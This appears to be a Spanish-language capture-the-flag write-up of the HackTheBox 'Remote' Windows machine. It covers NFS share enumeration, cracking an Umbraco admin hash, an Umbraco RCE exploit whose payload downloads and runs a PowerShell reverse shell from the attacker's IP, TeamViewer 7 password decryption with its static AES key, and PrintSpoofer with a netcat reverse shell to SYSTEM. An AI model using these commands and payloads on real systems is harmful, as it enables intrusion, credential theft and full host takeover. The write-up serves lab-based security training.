---
title: HackTheBox - Remote
author: cotes
date: 2023-09-22 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Windows, 'Information Leakage', 'Umbraco 7.12.4 RCE', 'TeamViewer Exploitation', 'PrintSpoofer']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Remote/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Remote Machine Logo
---

Máquina Windows de nivel **Easy** de HackThBox.

Técnicas usadas: **Information Leakage, Team Viewer Exploitation, PrintSpoofer**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Remote/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Remote/02-versions.png)

* Realizamos un fuzzing al servicio web

    ```bash
    ❯ dirsearch -u http://<IP Remote>/

    <SNIP>
    [14:27:26] 200 -    6KB - /umbraco/webservices/codeEditorSave.asmx
    ```

    > **Umbraco** es un CMS desarrollado en C# para Microsoft
    {: .prompt-info }

* Lo más interesante del servicio **rpcbind** que existe el servicio NFS. Listamos las monturas disponibles

    ```bash
    ❯ showmount -e <IP Remote>
    Export list for 10.10.10.180:
    /site_backups (everyone)
    ```

* Creamos un directorio con el nombre de la montura en `/mnt` y lo montamos

    ```bash
    ❯ mkdir site_backups
    ❯ mount -t nfs <IP Remote>:/site_backups /mnt/site_backups
    ```

c. Ahora ya podemos listar todo el contenido. Al investigar por algún fichero en el que se almacenen credenciales encontramos este [post](https://our.umbraco.com/forum/getting-started/installing-umbraco/35554-Where-does-Umbraco-store-usernames-and-passwords). Aquí nos mencionan que existen credenciales en **App_Data/Umbraco.sdf**

```bash
❯ strings Umbraco.sdf | less

adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
<SNIP>
```

* Obtenemos un correo **admin@htb.local** y un hash **b8be16afba8c314ad33d812f22a04991b90e2aaa** el cual crackearemos con john

    ```bash
    ❯ john admin_hash -w=/usr/share/wordlists/rockyou.txt

    baconandcheese
    ```

d. Estas credenciales nos servirán para el panel de login de **Umbraco**. Una vez dentro, podemos ver la versión de este CMS

![](/assets/images/HTB/Easy/Remote/03-version.png)

* Buscamos un exploit para esta versión de Umbraco [Exploit Db](https://www.exploit-db.com/exploits/46153)

* Primero, nos descargamos [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) y le añadimos esta línea al final

    ```ps1
    Invoke-PowerShellTcp -Reverse -IPAddress <tun0 IP> -Port 443
    ```

* Ahora modificamos el script 

    ```python
    login = "admin@htb.local";
    password="baconandcheese";
    host = "http://<IP Remote>";


    <SNIP>
    string cmd = "/c powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.18/reverse.ps1\')"
    proc.StartInfo.FileName = "cmd.exe";
    <SNIP>
    ```

* Montamos un servicio con python, nos ponemos en escucha con nc y ejecutamos el exploit

    ![](/assets/images/HTB/Easy/Remote/04-reverse.png)

### Escalada de Privilegios 💹

Existen 2 formas de escalar privilegios

a. Al investigar un poco el sistema veremos que existe un TeamViewer 7

```ps1
PS C:\Program Files (x86)\TeamViewer> dir

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ---- 
d-----        2/27/2020  10:35 AM                Version7
```

* Si investigamos alguna forma de explotarlo conseguiremos este [exploit](https://github.com/zaphoxx/WatchTV/blob/master/WatchTV.ps1)

b. Los pasos que debemos seguir son

```ps1
PS C:\Program Files (x86)\TeamViewer\Version7> cd HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7
PS HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7> (get-itemproperty .).SecurityPasswordAES
```

* El output del último comando lo pasaremos a una lista.

* Ahora con un script en python obtendremos la contraseña en texto claro

    ```python
    from itertools import product
    from Crypto.Cipher import AES
    import Crypto.Cipher.AES

    key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    IV = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    decipher = AES.new(key,AES.MODE_CBC,IV)

    password_encode = bytes([255,155,28,115,214,107,206,49,172,65,62,174,19,27,70,79,88,47,108,226,209,225,243,218,126,141,55,107,38,57,78,91])
    plaintext = decipher.decrypt(password_encode).decode()
    print("[+] Password:", plaintext)
    -----------------------------------------------------------------------------------------------------------------------------------------------
    ❯ python3 decrypt.py
    [+] Password: !R3m0te!
    ```

* Con esta credencial nos podemos conectar con evil-winrm

    ```bash
    ❯ evil-winrm -i 10.10.10.180 -u administrator -p '!R3m0te!'
    *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
    remote\administrator
    ```

a. La segunda forma es ejecutando [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0). Lo pasamos a la máquina víctima, en conjunto con nc.exe

```bash
❯ ls
PrintSpoofer64.exe
nc.exe
❯ python -m http.server 80
-------------------------------------------------------------------------------------------
PS C:\Temp> iwr -Uri "http://<tun0 IP>/PrintSpoofer64.exe" -OutFile ".\PrintSpoofer64.exe"
PS C:\Temp> iwr -Uri "http://<tun0 IP>/nc.exe" -OutFile ".\nc.exe"
```

* Ahora nos enviamos una reverse shell y ya seremos **nt authority\system**

    ```bash
    PS C:\Temp> .\PrintSpoofer64.exe -i -c "C:\Temp\nc.exe -e cmd 10.10.14.18 4444"


    ❯ nc -lvnp 4444
    Microsoft Windows [Version 10.0.17763.107]
    (c) 2018 Microsoft Corporation. All rights reserved.
    ----------------------------------------------------
    C:\Windows\system32>whoami
    nt authority\system
    ```